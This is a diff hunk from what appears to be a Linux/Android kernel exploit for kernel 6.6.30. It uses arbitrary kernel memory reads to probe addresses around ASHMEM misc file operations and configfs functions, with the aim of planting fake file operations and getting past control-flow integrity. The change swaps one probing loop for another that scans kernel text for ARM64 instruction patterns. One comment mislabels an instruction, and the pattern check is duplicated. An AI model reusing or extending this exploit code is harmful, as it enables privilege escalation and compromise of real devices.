@@ -260,28 +260,26 @@ int try_cfi_stage(void) {
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
 
-  /* Probe around expected offset to find correct ASHMEM_MISC_FOPS for kernel 6.6.30 */
   pr_info("cfi probe start misc_fops=%016zx pre_rb=%zd pre_fops=%016llx want=%016zx\n",
           misc_fops, pre_rb, (unsigned long long)pre_fops, fake_fops);
-  /* Check page boundaries */
-  uintptr_t page_base = misc_fops & ~0xfffULL;
-  for (int i = -2; i <= 2; i++) {
-    uintptr_t probe = page_base + i * 0x1000 + (misc_fops & 0xfff);
-    uint64_t probe_val = 0;
-    ssize_t probe_rb = configfs_read_once(fd, probe, &probe_val, sizeof(probe_val));
-    pr_info("cfi probe_page[%d] addr=%016zx rb=%zd val=%016llx\n",
-            i, probe, probe_rb, (unsigned long long)probe_val);
-  }
-  /* Check wider range with 64-byte stride */
-  for (int i = -8; i <= 8; i++) {
-    uintptr_t probe = misc_fops + i * 64;
-    uint64_t probe_val = 0;
-    ssize_t probe_rb = configfs_read_once(fd, probe, &probe_val, sizeof(probe_val));
-    if (probe_rb != 0) {
-      pr_info("cfi probe_wide[%d] addr=%016zx rb=%zd val=%016llx ***\n",
-              i, probe, probe_rb, (unsigned long long)probe_val);
+
+  /* CONFIGFS_READ_ITER may be wrong for kernel 6.6.30 - probe using physical read */
+  uintptr_t configfs_read_iter = text_addr(CONFIGFS_READ_ITER);
+  pr_info("cfi CONFIGFS_READ_ITER=%016zx probing for valid function...\n", configfs_read_iter);
+  for (int i = -20; i <= 20; i++) {
+    uintptr_t probe = configfs_read_iter + i * 8;
+    uint64_t val = 0;
+    if (kernel_read_data(-1, probe, &val, sizeof(val)) == sizeof(val)) {
+      /* Check for ARM64 function prologue pattern: d65f03c0 (br x30) or aaXX03e0 (mov xN, xZR) */
+      if ((val & 0xfffffc1f) == 0xd65f03c0 || (val & 0xffc003ff) == 0xaa0003e0 ||
+          (val & 0xfffffc1f) == 0xd65f03c0 || (val >> 16) == 0xd65f) {
+        pr_info("cfi PROBE[%d] %016zx val=%016llx ARM64_FUNC ***\n", i, probe, (unsigned long long)val);
+      } else if (i == 0) {
+        pr_info("cfi PROBE[%d] %016zx val=%016llx\n", i, probe, (unsigned long long)val);
+      }
     }
   }
+
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
